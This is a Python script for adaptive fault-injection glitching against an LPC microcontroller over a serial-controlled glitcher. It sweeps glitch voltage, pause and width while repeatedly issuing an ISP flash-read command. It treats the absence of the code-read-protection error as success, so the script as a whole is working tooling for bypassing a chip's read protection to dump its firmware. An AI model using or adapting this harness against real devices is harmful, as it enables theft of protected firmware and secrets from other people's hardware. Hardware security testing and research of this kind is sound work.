#!/usr/bin/env python3
"""
Adaptive glitch parameter exploration.

Strategy:
1. Find a pause value that causes crashes at max voltage (500V)
2. Reduce voltage until crash rate < 50%
3. Lock voltage at that level
4. Explore other pause values at locked voltage
5. Repeat to map out full parameter space
"""

import serial
import time
import csv
from datetime import datetime
import os

SERIAL_PORT = '/dev/ttyACM1'
BAUD_RATE = 115200
TIMEOUT = 2.0

# Test iterations per parameter combo
ITERATIONS_PER_TEST = 10  # Test each combo 10 times to get crash rate


def send_command(ser, cmd, wait_time=0.2):
    if ser.in_waiting > 0:
        ser.read(ser.in_waiting)
    ser.write(f"{cmd}\r\n".encode())

    if cmd.startswith("CS "):
        response = ""
        max_wait = 3.0
        start_time = time.time()
        while time.time() - start_time < max_wait:
            time.sleep(0.1)
            if ser.in_waiting > 0:
                chunk = ser.read(ser.in_waiting).decode('utf-8', errors='ignore')
                response += chunk
                if "#" in chunk:
                    break
        return response
    else:
        time.sleep(wait_time)
        response = ""
        if ser.in_waiting > 0:
            response = ser.read(ser.in_waiting).decode('utf-8', errors='ignore')
        return response


def wait_for_response(ser, expected_text, timeout=5.0):
    start_time = time.time()
    full_response = ""
    while time.time() - start_time < timeout:
        if ser.in_waiting > 0:
            chunk = ser.read(ser.in_waiting).decode('utf-8', errors='ignore')
            full_response += chunk
            if expected_text in full_response:
                return True, full_response
        time.sleep(0.01)
    return False, full_response


def setup_system(ser):
    """Initial setup."""
    print("Setting up system...")
    send_command(ser, "TARGET LPC", wait_time=0.2)
    send_command(ser, "TRIGGER UART 0d", wait_time=0.2)
    send_command(ser, "CS TRIGGER HARDWARE HIGH", wait_time=0.5)
    send_command(ser, "CS ARM", wait_time=1.0)
    print("Setup complete\n")


def test_single_glitch(ser, voltage, pause, width):
    """Test single glitch parameters."""
    # Update parameters
    send_command(ser, f"CS VOLTAGE {voltage}", wait_time=0.5)
    send_command(ser, f"SET PAUSE {pause}", wait_time=0.2)
    send_command(ser, f"SET WIDTH {width}", wait_time=0.2)

    # Sync
    ser.write(b"TARGET SYNC 115200 12000 10\r\n")
    success, _ = wait_for_response(ser, "LPC ISP sync complete", timeout=5.0)
    if not success:
        return "SYNC_FAIL"

    # Arm and test
    send_command(ser, "ARM ON", wait_time=0.2)
    ser.write(b'TARGET SEND "R 0 516096"\r\n')
    time.sleep(1.0)

    response = ""
    if ser.in_waiting > 0:
        response = ser.read(ser.in_waiting).decode('utf-8', errors='ignore')

    if "19" in response:
        return "ERROR19"
    elif "No response data" in response or not response.strip():
        return "NO_RESPONSE"
    elif "0" in response and "19" not in response:
        return "SUCCESS"
    else:
        return "UNKNOWN"


def test_parameters_multiple(ser, voltage, pause, width, iterations=10):
    """Test parameters multiple times and return statistics."""
    results = []
    for i in range(iterations):
        result = test_single_glitch(ser, voltage, pause, width)
        results.append(result)
        print(f"  [{i+1}/{iterations}] V={voltage}, P={pause}, W={width}: {result}")

    success_count = results.count("SUCCESS")
    no_response_count = results.count("NO_RESPONSE")
    error19_count = results.count("ERROR19")

    crash_rate = (no_response_count / iterations) * 100
    success_rate = (success_count / iterations) * 100

    return {
        'success': success_count,
        'no_response': no_response_count,
        'error19': error19_count,
        'crash_rate': crash_rate,
        'success_rate': success_rate,
        'results': results
    }


def find_crash_pause(ser, width=150):
    """Find a pause value that causes crashes at V=500."""
    print("=" * 70)
    print("PHASE 1: Finding crash pause value")
    print("=" * 70)
    print(f"Testing at V=500, Width={width}\n")

    # Test pause values from early to late
    pause_values = [0, 500, 1000, 1500, 2000, 2500, 3000, 3500, 4000,
                    4500, 5000, 5500, 6000, 6500, 7000, 7500]

    for pause in pause_values:
        print(f"\nTesting Pause={pause}...")
        stats = test_parameters_multiple(ser, 500, pause, width, iterations=5)

        if stats['crash_rate'] > 50:
            print(f"\n✓ Found crash pause: {pause} (crash rate: {stats['crash_rate']:.1f}%)")
            return pause

    print("\n✗ No crash pause found in range!")
    return None


def find_optimal_voltage(ser, pause, width=150):
    """Find voltage with 0% < crash rate < 100%, preferably ~50%."""
    print("\n" + "=" * 70)
    print("PHASE 2: Finding optimal voltage")
    print("=" * 70)
    print(f"Testing at Pause={pause}, Width={width}\n")

    # Phase 2a: Start at 500V and work down in 25V steps to find non-crash voltage
    print("Phase 2a: Finding voltage with 0% crashes...")
    last_crash_voltage = None
    no_crash_voltage = None

    for voltage in range(500, 149, -25):
        print(f"\nTesting Voltage={voltage}...")
        stats = test_parameters_multiple(ser, voltage, pause, width, iterations=10)

        print(f"  Crash rate: {stats['crash_rate']:.1f}%")
        print(f"  Success rate: {stats['success_rate']:.1f}%")

        if stats['success_rate'] > 0:
            print(f"\n✓✓✓ SUCCESS FOUND at V={voltage}! ✓✓✓")
            return voltage, stats

        if stats['crash_rate'] == 100:
            last_crash_voltage = voltage
        elif stats['crash_rate'] == 0:
            no_crash_voltage = voltage
            print(f"\n✓ Found 0% crash voltage: {voltage}")
            break
        else:
            # Found intermediate crash rate!
            print(f"\n✓ Found intermediate crash rate: {stats['crash_rate']:.1f}% at V={voltage}")
            return voltage, stats

    # Phase 2b: Fine-tune voltage to get ~50% crash rate
    if last_crash_voltage is not None and no_crash_voltage is not None:
        print(f"\n\nPhase 2b: Fine-tuning voltage between {no_crash_voltage}V and {last_crash_voltage}V...")

        # Test intermediate voltages
        for voltage in range(no_crash_voltage + 5, last_crash_voltage + 1, 5):
            print(f"\nTesting Voltage={voltage}...")
            stats = test_parameters_multiple(ser, voltage, pause, width, iterations=10)

            print(f"  Crash rate: {stats['crash_rate']:.1f}%")
            print(f"  Success rate: {stats['success_rate']:.1f}%")

            if stats['success_rate'] > 0:
                print(f"\n✓✓✓ SUCCESS FOUND at V={voltage}! ✓✓✓")
                return voltage, stats

            if 0 < stats['crash_rate'] < 100:
                print(f"\n✓ Optimal voltage found: {voltage} (crash rate: {stats['crash_rate']:.1f}%)")
                return voltage, stats

        # If we still haven't found intermediate, use the lowest voltage that had some crashes
        print(f"\n✓ Using voltage: {no_crash_voltage + 5}V (boundary voltage)")
        return no_crash_voltage + 5, None

    print("\n✗ Could not find optimal voltage!")
    return 150, None


def explore_pause_range_at_voltage(ser, voltage, width=150):
    """Explore full pause range at locked voltage with progressively finer steps."""
    print("\n" + "=" * 70)
    print("PHASE 3: Exploring pause range at optimal voltage")
    print("=" * 70)
    print(f"Testing at V={voltage}, Width={width}\n")

    # Create result log
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    csv_file = f"adaptive_results_{timestamp}_V{voltage}.csv"

    with open(csv_file, 'w', newline='', buffering=1) as f:
        writer = csv.writer(f)
        writer.writerow(['pause', 'voltage', 'width', 'success_rate', 'crash_rate', 'results'])

        # Progressive step sizes: start coarse, get finer if no success
        step_sizes = [100, 10, 5]

        for step_idx, step in enumerate(step_sizes):
            print(f"\n{'='*70}")
            print(f"Pass {step_idx + 1}: Testing with step size = {step} cycles")
            print(f"{'='*70}\n")

            pause_values = list(range(0, 8001, step))
            success_found = False

            for i, pause in enumerate(pause_values):
                print(f"\n[{i+1}/{len(pause_values)}] Testing Pause={pause} (step={step})...")
                stats = test_parameters_multiple(ser, voltage, pause, width, iterations=10)

                print(f"  Success: {stats['success_rate']:.1f}%  Crash: {stats['crash_rate']:.1f}%")

                writer.writerow([pause, voltage, width, stats['success_rate'],
                               stats['crash_rate'], ','.join(stats['results'])])
                f.flush()

                if stats['success_rate'] > 0:
                    print(f"\n✓✓✓ SUCCESS at Pause={pause}! ✓✓✓")
                    success_found = True
                    break

            if success_found:
                break

            # If we finished this pass without success, move to finer step
            if step_idx < len(step_sizes) - 1:
                print(f"\n{'='*70}")
                print(f"No success found with step={step}. Moving to finer granularity...")
                print(f"{'='*70}")

    print(f"\nResults saved to: {csv_file}")
    return csv_file


def main():
    print("=" * 70)
    print("ADAPTIVE GLITCH PARAMETER EXPLORATION")
    print("=" * 70)
    print()

    # Connect
    ser = serial.Serial(SERIAL_PORT, BAUD_RATE, timeout=TIMEOUT)
    time.sleep(0.5)

    try:
        setup_system(ser)

        # Phase 1: Find crash pause
        crash_pause = find_crash_pause(ser)
        if crash_pause is None:
            print("Cannot proceed without crash pause")
            return

        # Phase 2: Find optimal voltage
        optimal_voltage, stats = find_optimal_voltage(ser, crash_pause)
        if stats and stats['success_rate'] > 0:
            print("\n" + "=" * 70)
            print("SUCCESS FOUND IN VOLTAGE SWEEP!")
            print("=" * 70)
            return

        # Phase 3: Explore pause range at optimal voltage
        # This will now automatically try progressively finer steps: 100 -> 10 -> 5
        csv_file = explore_pause_range_at_voltage(ser, optimal_voltage)

        print("\n" + "=" * 70)
        print("EXPLORATION COMPLETE")
        print("=" * 70)
        print(f"Results: {csv_file}")

    finally:
        ser.close()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\nExploration stopped by user")
